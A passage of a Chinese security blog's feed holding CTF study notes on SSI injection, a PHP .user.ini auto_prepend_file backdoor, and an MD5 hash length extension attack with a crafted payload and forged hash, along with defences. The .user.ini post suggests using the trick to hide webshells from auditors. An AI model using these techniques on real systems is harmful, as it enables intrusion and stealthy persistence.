src="http://images.xianyu123.club/qt6.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Mac下pycharm + python3.7 + PyQt5 + Qt5.13.1配置&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://0clickjacking0.github.io/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>ssi漏洞小结</title>
    <link href="http://0clickjacking0.github.io/2019/09/13/ssi%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2019/09/13/ssi漏洞小结/</id>
    <published>2019-09-13T12:21:40.000Z</published>
    <updated>2019-09-15T08:54:07.213Z</updated>
    
    <content type="html"><![CDATA[<p>打省赛的时候遇到了，这里记录学习一下姿势</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞是一个比较老的漏洞，因为今年的省赛遇到了，所以在这里记录学习一下。</p><h1 id="关于SSI"><a href="#关于SSI" class="headerlink" title="关于SSI"></a>关于SSI</h1><p>SSI是英文”Server Side Includes”的缩写，翻译成中文就是服务器端包含的意思。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p><h1 id="启用SSI"><a href="#启用SSI" class="headerlink" title="启用SSI"></a>启用SSI</h1><p><strong>示例：Nginx 配置SSI功能</strong></p><p>在http段中加入下面几句即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssi on;</span><br><span class="line">ssi_silent_errors off;</span><br><span class="line">ssi_types text/shtml;</span><br></pre></td></tr></table></figure><p>默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。</p><p>IIS和Apache都可以开启SSI功能，具体可参考:<a href="http://m.jb51.net/article/25725.htm" target="_blank" rel="noopener">Apache、Nginx 服务配置服务器端包含（SSI）](http://m.jb51.net/article/25725.htm</a></p><h1 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h1><h2 id="config指令：用于修改SSI的默认设置"><a href="#config指令：用于修改SSI的默认设置" class="headerlink" title="config指令：用于修改SSI的默认设置"></a>config指令：用于修改SSI的默认设置</h2><p>参数：<code>errmsg</code>,<code>timefmt</code>, <code>sizefmt</code></p><p><strong>errmsg</strong>:设置默认的错误信息，该指令必须入在其它指令的前面</p><p>eg：<code>&lt;!--#config errmsg=&quot;error!please email mamager!&quot;--&gt;</code></p><p><strong>Timefmt</strong>:设置日期与时间的显示格式，需放在echo指令前</p><p>eg：<code>&lt;!--#config timefmt=&quot;%A, %B %d, %Y&quot;--&gt;</code></p><p>　<code>&lt;!--#echo var=&quot;last_modified&quot;--&gt;</code></p><p><strong>Sizefmt</strong>:设置表示文件大小的单位。如bytes。该指令需要放在fsize指令前使用。</p><p>eg：<code>&lt;!--#config sizefmt=&quot;bytes&quot;--&gt;</code></p><p>　<code>&lt;!--#fsize file=&quot;head.html&quot;--&gt;</code></p><h2 id="Include指令：用于将其它文档或元素包含在当前文档中"><a href="#Include指令：用于将其它文档或元素包含在当前文档中" class="headerlink" title="Include指令：用于将其它文档或元素包含在当前文档中"></a>Include指令：用于将其它文档或元素包含在当前文档中</h2><p>参数：<code>virtual</code> ，<code>file</code></p><p><strong>virtual</strong>:给出到服务器端某个文档的虚拟路径</p><p>eg：<code>&lt;!--include virtual=&quot;/includes/header.html&quot;--&gt;</code></p><p><strong>file</strong>:给出到当前目录的相对路径，其中不能使用”../“，也不能使用绝对路径</p><p>eg：<code>&lt;!--include file=&quot;header.html&quot;--&gt;</code></p><p>这就要求每一个目录中都包含一个header.html文件。</p><h2 id="exec指令：将某一外部程序的输出插入到页面中，执行CGI脚本或者shell命令"><a href="#exec指令：将某一外部程序的输出插入到页面中，执行CGI脚本或者shell命令" class="headerlink" title="exec指令：将某一外部程序的输出插入到页面中，执行CGI脚本或者shell命令"></a>exec指令：将某一外部程序的输出插入到页面中，执行CGI脚本或者shell命令</h2><p>参数：cmd，cgi</p><p>cmd 常规应用程序：<code>&lt;!--#exec cmd=&quot;文件名称&quot;--&gt;</code></p><p>cgi CGI脚本程序：<code>&lt;!--#exec cgi=&quot;文件名称&quot;--&gt;</code></p><p>注意：这个指令相当方便,但是也存在安全问题。</p><h2 id="echo：用于显示各种环境变量"><a href="#echo：用于显示各种环境变量" class="headerlink" title="echo：用于显示各种环境变量"></a>echo：用于显示各种环境变量</h2><p>参数：var</p><p>eg：<code>&lt;!--#config timefmt=&quot;%A,the %d of %B,in the year %Y&quot;--&gt;</code></p><p>　<code>&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;</code></p><p>输出结果：<code>Saturday, the 15 of April, in the year 2000</code></p><h2 id="以下是常见的服务器变量"><a href="#以下是常见的服务器变量" class="headerlink" title="以下是常见的服务器变量"></a>以下是常见的服务器变量</h2><p><code>DOCUMENT_NAME</code>：显示当前文档的名称</p><p><code>DOCUMENT_URI</code>：显示当前文档的虚拟路径</p><p><code>QUERY_STRING_UNESCAPED</code>：显示未经转义处理的由客户端发送的查询字串，其中所有的特殊字符前面都有转义符”\</p><p><code>DATE_LOCAL</code>：显示服务器设定时区的日期和时间。用户可以结合config命令的timefmt参数，定制输出信息</p><p><code>DATE_GMT</code>：功能与DATE_LOCAL一样，只不过返回的是以格林尼治标准时间为基准的日期</p><p><code>LAST_MODIFIED</code>：显示当前文档的最后更新时间</p><h2 id="除了SSI环境变量之外，echo命令还可以显示以下CGI环境变量"><a href="#除了SSI环境变量之外，echo命令还可以显示以下CGI环境变量" class="headerlink" title="除了SSI环境变量之外，echo命令还可以显示以下CGI环境变量"></a>除了SSI环境变量之外，echo命令还可以显示以下CGI环境变量</h2><p><code>SERVER_SOFTWARE</code>：显示服务器软件的名称和版本</p><p><code>SERVER_NAME</code>：显示服务器的主机名称，DNS别名或IP地址</p><p><code>SERVER_PROTOCOL</code>：显示客户端请求所使用的协议名称和版本，如HTTP/1.0</p><p><code>SERVER_PORT</code>：显示服务器的响应端口</p><p><code>REQUEST_METHOD</code>：显示客户端的文档请求方法，包括GET, HEAD, 和POST</p><p><code>REMOTE_HOST</code>：显示发出请求信息的客户端主机名称</p><p><code>REMOTE_ADDR</code>：显示发出请求信息的客户端IP地址</p><p><code>AUTH_TYPE</code>：显示用户身份的验证方法</p><p><code>REMOTE_USER</code>:显示访问受保护页面的用户所使用的帐号名称</p><p>Fsize：显示指定文件的大小，可以结合config命令的sizefmt参数定制输出格式</p><p>参数：file</p><p>eg：<code>&lt;!--#fsize file=&quot;index_working.html&quot;--&gt;</code></p><h2 id="Flastmod"><a href="#Flastmod" class="headerlink" title="Flastmod"></a>Flastmod</h2><p>显示指定文件的最后修改日期，可以结合config命令的timefmt参数控制输出格式</p><p>参数：file</p><p>eg：<code>&lt;!--#config timefmt=&quot;%A, the %d of %B, in the year %Y&quot;--&gt;</code></p><p>　　<code>&lt;!--#flastmod file=&quot;file.html&quot;--&gt;</code></p><h2 id="XSSI-Extended-SSI"><a href="#XSSI-Extended-SSI" class="headerlink" title="XSSI(Extended SSI)"></a>XSSI(Extended SSI)</h2><p>一组高级SSI指令,内置于Apache1.2或更高版本的mod-include模块之中。</p><p><strong>#printenv</strong>：显示当前存在于WEB服务器环境中的所有环境变量。<br>语法：<code>&lt;!--#printenv--&gt;</code></p><p><strong>#set</strong>：可给变量赋值,以用于后面的if语句。<br>语法：<code>&lt;!--#set var=&quot;变量名&quot; value=&quot;变量值&quot;--&gt;</code><br>eg：<br><code>&lt;!--#set var=&quot;color&quot; value=&quot;red&quot;--&gt;</code><br><code>&lt;!--#echo var=&quot;color&quot;--&gt;</code></p><p><strong>#if</strong>：创建可以改变数据的页面,这些数据根据使用if语句时计算的要求予以显示。<br>语法：<br><code>&lt;!--#if expr=&quot;$变量名=&#39;变量值A&#39;&quot;--&gt;</code><br>  显示内容<br><code>&lt;!--#elif expr=&quot;$变量名=&#39;变量值B&#39;&quot;--&gt;</code><br>  显示内容<br><code>&lt;!--#else--&gt;</code><br>  显示内容<br><code>&lt;!--#endif--&gt;</code><br>eg：<br><code>&lt;!--#if expr=&quot;$color=&#39;red&#39;&quot;--&gt;</code><br>    红色<br><code>&lt;!--#elif expr=&quot;$color=&#39;blue&#39;&quot;--&gt;</code><br>    蓝色<br><code>&lt;!--#else--&gt;</code><br>    黑色<br><code>&lt;!--#endif--&gt;</code></p><h2 id="SSI内置的变量"><a href="#SSI内置的变量" class="headerlink" title="SSI内置的变量"></a>SSI内置的变量</h2><p><code>AUTH_TYPE</code> ——针对用户的认证授权方式： BASIC ， FORM ， etc. 和 Tomcat 内的认证方式同步<br><code>CONTENT_LENGTH</code> ——从服务器表单传过来的数据长度，字符数目或者数据的字节数<br><code>CONTENT_TYPE</code> ——服务器访问呢数据的 MIME 类型，比如“ text/html ”<br><code>DATE_GMT</code> ——目前的时间格式方式使用 GMT<br><code>DATE_LOCAL</code> ——目前的时间格式方式设置成为本地时间格式<br><code>DOCUMENT_NAME</code> ——当前上下文环境的文件地址<br><code>DOCUMENT_URI</code> ——虚拟路径定义的文件地址<br><code>GATEWAY_INTERFACE</code> —— CGI 的版本定义：“ CGI/1.1 ”<br><code>HTTP_ACCEPT</code> ——一个客户端可以接受的 MIME 类型列表<br><code>HTTP_ACCEPT_ENCODING</code> ——客户端可以接受的压缩文件类型的列表<br><code>HTTP_ACCEPT_LANGUAGE</code> ——客户端可以支持的语言列表<br><code>HTTP_CONNECTION</code> ——管理客户端的连接：是“ Close ”还是“ Keep-Alive ”<br><code>HTTP_HOST</code> ——客户端请求的站点地址<br><code>HTTP_REFERER</code> ——客户端请求之前所在的 URL 地址<br><code>HTTP_USER_AGENT</code> ——客户使用的浏览器端的请求结果<br><code>LAST_MODIFIED</code> ——当前页面上一次访问和修改的时间<br><code>PATH_INFO</code> ——访问此 Servlet 的路径信息<br><code>PATH_TRANSLATED</code> —— PATH_INFO 提供的 translated 版本<br><code>QUERY_STRING</code> ——在 URL 地址 ? 之后的请求参数列表<br><code>QUERY_STRING_D</code> ——没有经过编码过的请求参数<br><code>REMOTE_ADDR</code> ——用户请求客户端 IP 地址<br><code>REMOTE_HOST</code> ——用户发送请求的主机名<br><code>REMOTE_PORT</code> ——用户发送请求的端口号<br><code>REMOTE_USER</code> ——认证授权需要的发送请求的用户名<br><code>REQUEST_METHOD</code> ——请求使用方法： GET 或者 POST<br><code>REQUEST_URI</code> ——客户端原来访问请求的 Web 页面的 URI 地址<br><code>SCRIPT_FILENAME</code> ——在服务器上当前页面的地址<br><code>SCRIPT_NAME</code> ——当前页面的名称<br><code>SERVER_ADDR</code> ——服务器所在的 IP 地址<br><code>SERVER_NAME</code> ——服务器的主机名或者 IP 地址<br><code>SERVER_PORT</code> ——服务器接受请求的端口号<br><code>SERVER_PROTOCOL</code> ——服务器处理请求的协议：“ HTTP/1.1 ”<br><code>SERVER_SOFTWARE</code> ——服务器响应客户端请求的名称和版本号</p><h2 id="SSI中日期格式的定义"><a href="#SSI中日期格式的定义" class="headerlink" title="SSI中日期格式的定义"></a>SSI中日期格式的定义</h2><p><code>%a</code> 一周七天的缩写形式 Thu<br><code>%A</code> 一周七天 Thursday<br><code>%b</code> 月的缩写形式 Apr<br><code>%B</code> 月 April<br><code>%d</code> 一个月内的第几天 13<br><code>%D</code> mm/dd/yy日期格式 04/13/00<br><code>%H</code> 小时（24小时制，从00到23） 01<br><code>%I</code> 小时（12小时制，从00到11） 01<br><code>%j</code> 一年内的第几天，从01到365 104<br><code>%m</code> 一年内的第几个月，从01到12 04<br><code>%M</code> 一小时内的第几分钟，从00到59 10<br><code>%p</code> AM或PM AM<br><code>%r</code> 12小时制的当地时间，格式为 01:10:18 AM<br><code>%S</code> 一分钟内的第几秒，从00到59 18<br><code>%T</code> 24小时制的%H:%M:%S时间格式 01:10:18<br><code>%U</code> 一年内的第几个星期，从00到52，以星期天作为每个星期的第一天<br><code>%w</code> 一星期内的第一天，从0到6 4<br><code>%W</code> 一年内的第几个星期，从00到 53，以星期一作为每个星期的第一天<br><code>%y</code> 年的缩写形式，从00到99 00<br><code>%Y</code> 用四位数字表示一年 2000<br><code>%Z</code> 时区名称</p><h1 id="SSI漏洞产生的条件"><a href="#SSI漏洞产生的条件" class="headerlink" title="SSI漏洞产生的条件"></a>SSI漏洞产生的条件</h1><p>用户存在可控输入，并且未过滤，并且还能回显嵌入到html中，如其中一条</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;&quot;...&quot;&quot;--&gt;（会执行给定的 shell 命令）</span><br></pre></td></tr></table></figure><p>如果没有过滤吧<code>&lt;!#–</code>等敏感字符，就会造成系统命令执行，<br>通常存在XSS的地方如果开启了SSI服务，那么就会造成服务器注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;&quot;...&quot;&quot;--&gt;（会显示给定的文件）</span><br></pre></td></tr></table></figure><p>但感觉这个漏洞在目前的状况来说就是绝迹了，因为apache和nginx都默认关闭了ssi，就算开启了ssi，也不一定有开启回显的，除非有哪个程序员真的自己作死，😂</p><h1 id="SSI防护"><a href="#SSI防护" class="headerlink" title="SSI防护"></a>SSI防护</h1><ul><li>关闭服务器SSI功能</li><li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><p><a href="[https://www.sherlocklee.top/2018/10/28/%E6%B3%A8%E5%85%A5/ssi%E6%BC%8F%E6%B4%9E/](https://www.sherlocklee.top/2018/10/28/注入/ssi漏洞/">ssi漏洞</a>)</p></li><li><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">服务器端包含注入SSI分析总结</a></p></li><li><p><a href="[https://shuaizhupeiqi.github.io/2018/11/17/SSI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B3%A8%E5%85%A5/](https://shuaizhupeiqi.github.io/2018/11/17/SSI服务器注入/">SSI服务器注入</a>)</p></li><li><p><a href="https://www.cnblogs.com/wqhwe/p/5442612.html" target="_blank" rel="noopener">SSI指令</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;打省赛的时候遇到了，这里记录学习一下姿势&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>user.ini文件构成的PHP后门</title>
    <link href="http://0clickjacking0.github.io/2019/08/29/user-ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8/"/>
    <id>http://0clickjacking0.github.io/2019/08/29/user-ini文件构成的PHP后门/</id>
    <published>2019-08-29T06:09:08.000Z</published>
    <updated>2019-08-29T06:59:22.348Z</updated>
    
    <content type="html"><![CDATA[<p>在suctf2019第一次遇到，这里学习记录一下</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在suctf2019一道上传的题目中第一次遇到，也学习掌握了新姿势，这里记录一下</p><h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><p>我们先看下php官方手册对<code>.user.ini</code>对说明</p><p><img src="http://images.xianyu123.club/user.ini.png" alt></p><p>也就是说我们可以在<code>.user.ini</code>中设置<code>php.ini</code>中<strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置，而且只要是在使用 <strong>CGI／FastCGI</strong> 模式的服务器上都可以使用<code>.user.ini</code></p><p>这里我们发现了两个有趣的设置：<strong>auto_prepend_file</strong>和<strong>auto_append_file</strong></p><p><img src="http://images.xianyu123.club/user.ini2.png" alt></p><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=1.gif</span><br></pre></td></tr></table></figure><p>1.gif是要包含的文件。</p><p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p><p>这两个设置的区别只是在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p><h1 id="在实战中的利用"><a href="#在实战中的利用" class="headerlink" title="在实战中的利用"></a>在实战中的利用</h1><p>综上所述<code>.user.ini</code>的利用条件如下：</p><ol><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol><p>从这来看<code>.user.ini</code>要比<code>.htaccess</code>的应用范围要广一些，毕竟<code>.htaccess</code>只能用于Apache</p><p>但仔细推敲我们就会感到<strong>上传目录下要有可执行的php文件</strong>这个要求在文件上传中也比较苛刻，应该没有开发者会把上传文件放在主目录或者把php文件放在上传文件夹。如果都能成功上传php文件并且执行，那为何还要上传<code>.user.ini</code>呢</p><p>不过把<code>.user.ini</code>利用在隐藏后门上应该是个很好的利用方法，我们在存在php文件的目录下留下<code>.user.ini</code>和我们的图片马或者一些看似正常php文件（其实是后门，来避开本地的一些防护软件或者安全人员的审计），这样就达到了隐藏后门的目的。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://xz.aliyun.com/t/6091" target="_blank" rel="noopener">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a></li><li><a href="[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html">p牛的user.ini文件构成的PHP后门</a>)</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在suctf2019第一次遇到，这里学习记录一下&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>hash扩展攻击</title>
    <link href="http://0clickjacking0.github.io/2019/07/09/hash%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://0clickjacking0.github.io/2019/07/09/hash扩展攻击/</id>
    <published>2019-07-09T07:50:59.000Z</published>
    <updated>2019-08-09T06:23:11.045Z</updated>
    
    <content type="html"><![CDATA[<p>这次国赛遇到了这个漏洞，以前看过这个漏洞，但没有吃透导致这次国赛没做出来，这次准备好好研究一下，写下这篇学习笔记</p><a id="more"></a><h1 id="hash原理"><a href="#hash原理" class="headerlink" title="hash原理"></a>hash原理</h1><p>首先要讲hash算法(例如md5)，但是也不需要太了解，只需要知道以下几点就可以了</p><ol><li><p>MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算 </p></li><li><p>我们关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。 </p></li><li><p>MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量IV，这一点很关键！！！</p></li></ol><p>下面已md5算法为代表简单讲解加密过程</p><h1 id="MD5加密过程"><a href="#MD5加密过程" class="headerlink" title="MD5加密过程"></a>MD5加密过程</h1><p>比如计算字符串<code>xianyu123</code>，首先要把它变成十六进制，十六进制为<code>0x7869616e7975313233</code><br><img src="http://images.xianyu123.club/hash_attack1.png" alt></p><h2 id="补位"><a href="#补位" class="headerlink" title="补位"></a>补位</h2><p>（1byte=8bit）消息必须进行补位，即使得其长度在对 512 取模后的值为 448。也就是说，<code>len(message) % 512 == 448</code>。当消息长度不满 448 bit 时<strong>（注意是位，而不是字符串长度）</strong>，消息长度达到 448 bit 即可。当然，如果消息长度已经达到 448 bit，也要进行补位。补位是必须的。<br>补位的方式的二进制表示是在消息的后面加上一个1，后面跟着无限个0，直到 <code>len(message) % 512 == 448</code>。在 16 进制下，我们需要在消息后补<code>80</code>，也就是 2 进制的<code>10000000</code>。我们把消息<code>xianyu123</code>进行补位到长度为56位的整数倍数</p><p><img src="http://images.xianyu123.club/hash_attack2.png" alt></p><h2 id="补长度"><a href="#补长度" class="headerlink" title="补长度"></a>补长度</h2><p>补位过后，第 57 个字节储存的是补位之前的消息长度。<code>xianyu123</code>是 9个字符串，也就是 9 个字节，72 bit。换算成 16 进制为<code>0x48</code>。其后跟着 7 个字节的 0x00，把消息补满 64 字节。</p><p>长度是<a href="https://blog.csdn.net/github_35681219/article/details/52743048" target="_blank" rel="noopener">小端存储</a>的，也就是说高字节放在高地址中。</p><p><strong>MD5中存储的都是小端方式！</strong><br><strong>MD5中存储的都是小端方式！</strong><br><strong>MD5中存储的都是小端方式！</strong><br>重要的事情说三遍，举个例子：假如我们这一块值为<code>0x12345678</code><br>那么在MD5运算时候存储的顺序是<code>0x78563412</code><br>这也是之所以后8字节为长度，而第1字节先有数据的原因</p><p><img src="http://images.xianyu123.club/hash_attack3.png" alt></p><h2 id="计算消息摘要"><a href="#计算消息摘要" class="headerlink" title="计算消息摘要"></a>计算消息摘要</h2><p>计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>我们不需要关心计算细节，我们只需要知道经过一次消息摘要后，上面的链变量将会<strong>被新的值覆盖</strong>，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。</p><h1 id="hash长度扩展攻击的实现"><a href="#hash长度扩展攻击的实现" class="headerlink" title="hash长度扩展攻击的实现"></a>hash长度扩展攻击的实现</h1><h2 id="2019年国赛华东南赛区分区赛"><a href="#2019年国赛华东南赛区分区赛" class="headerlink" title="2019年国赛华东南赛区分区赛"></a>2019年国赛华东南赛区分区赛</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$user=$_POST[<span class="string">'user'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $key;</span><br><span class="line">    <span class="keyword">return</span> md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (encrypt($user)===$_COOKIE[<span class="string">'verify'</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(strpos($user,<span class="string">'root'</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'not root！！！'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">"verify"</span>,encrypt(<span class="string">"guest"</span>),time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>);</span><br><span class="line">    setcookie(<span class="string">"len"</span>,strlen($key),time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br></pre></td></tr></table></figure><p>这题和ISCC2018的那题一模一样</p><p>我们虽然不知道<code>$key</code>的值，但是我们知道<code>$key</code>的长度，也知道<code>md5($key.&#39;guest&#39;)</code>的值。而我们得到的 hash 值正是最后一轮摘要后的经过高低位互换的链变量。<strong>在常规的摘要之后把我们控制的信息进行下一轮摘要，只需要知道上一轮消息产生的链变量</strong></p><p><img src="http://images.xianyu123.club/hash_attack4.png" alt></p><p>COOKIE中，<code>md5($key&#39;) = 8b3dd2057d3216ca78bf31ede947c0e3</code>，以及<code>$key</code>的长度为32。我们来进行哈希长度扩展攻击。</p><h2 id="长度扩展"><a href="#长度扩展" class="headerlink" title="长度扩展"></a>长度扩展</h2><p>首先$key是32个未知位，这里就用问号代替，然后跟上<code>guest</code>，接着我们把消息补到448bit，也就是56byte。然后补长度，37byte=296bit，也就是十六进制的128，然后用小段方式存储</p><p><img src="http://images.xianyu123.club/hash_attack5.png" alt></p><p>然后跟上要附加的值<code>root</code></p><p><img src="http://images.xianyu123.club/hash_attack6.png" alt></p><p>然后去掉前面的假的 <code>$key</code>，得到最终的 <code>$username</code>。<br><code>guest\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x01\x00\x00\x00\x00\x00\x00root</code><br>urlencode之后为<br><code>guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%28%01%00%00%00%00%00%00root</code><br>带入enc函数返回的就是<code>md5($key+guest+root)</code>的值。<br>然后把<code>md5($key+guest)</code>值作为加密root的初始链变量。</p><p>这里把原hash值（8b3dd2057d3216ca78bf31ede947c0e3）拆分为四组，即为：</p><p><code>8b3dd205</code>,<code>7d3216ca</code>,<code>78bf31ed</code>,<code>e947c0e3</code></p><p>在此将四组数值按照小端规则反序，可得如下四组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x05d23d8b</span><br><span class="line">B=0xca16327d</span><br><span class="line">C=0xed31bf78</span><br><span class="line">D=0xe3c047e9</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/hash_attack7.png" alt></p><p>然后用hashpump跑一下，得出了md5的值为<code>dca0083ab43d715a2eb8be1949b77469</code>，然后放入cookie中得到flag</p><p><img src="http://images.xianyu123.club/hash_attack8.png" alt></p><h2 id="CTF中的小技巧"><a href="#CTF中的小技巧" class="headerlink" title="CTF中的小技巧"></a>CTF中的小技巧</h2><p>用hashpump</p><p>Input Signature: 这里写原始的md5，也就是上面的verify<br>Input Data: 这里写原始的值，也就是<code>md5($key.$text);</code>与<code>$key</code>拼接的后面的那串值<code>$text</code><br>Input Key Length: 这里写key的长度<br>Input Data to Add: 这里写你想要的text的值，比如这里<code>md5($key.&#39;admin&#39;);</code>，那么这里就填写<code>admin</code></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>可以将消息摘要的值再进行消息摘要，这样就可以避免用户控制message了。也就是<a href="https://en.wikipedia.org/wiki/HMAC" target="_blank" rel="noopener">HMAC</a>算法。该算法大概来说是这样：<code>MAC =hash(secret + hash(secret + message))</code>，而不是简单的对密钥连接message之后的值进行哈希摘要。具体HMAC的工作原理有些复杂，但你可以有个大概的了解。重点是，由于这种算法进行了双重摘要，密钥不再受本文中的长度扩展攻击影响。HMAC最先是在1996年被发表，之后几乎被添加到每一种编程语言的标准函数库中。</li><li>将secret放置在消息末尾也能防止这种攻击。比如 hash(m+secret)，希望推导出 hash(m + secret||padding||m’)，由于自动附加secret在末尾的关系，会变成hash(m||padding||m’||secret)。现在的附加值可以看作是m’||secret，secret值不知道，从而导致附加字符串不可控，hash值也就不可控，因而防止了这种攻击。</li></ol><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">hash哈希长度扩展攻击解析（记录一下，保证不忘）</a></li><li><a href="https://www.smi1e.top/hello-world/" target="_blank" rel="noopener">Hash长度扩展攻击</a></li><li><a href="https://blog.csdn.net/qq_35078631/article/details/70941204" target="_blank" rel="noopener">用MD5实现hash长度扩展攻击 By Assassin</a></li><li><a href="https://xz.aliyun.com/t/2563" target="_blank" rel="noopener">哈希长度拓展攻击(Hash Length Extension Attacks)</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次国赛遇到了这个漏洞，以前看过这个漏洞，但没有吃透导致这次国赛没做出来，这次准备好好研究一下，写下这篇学习笔记&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>JWT(JSON Web Token) 攻击</title>
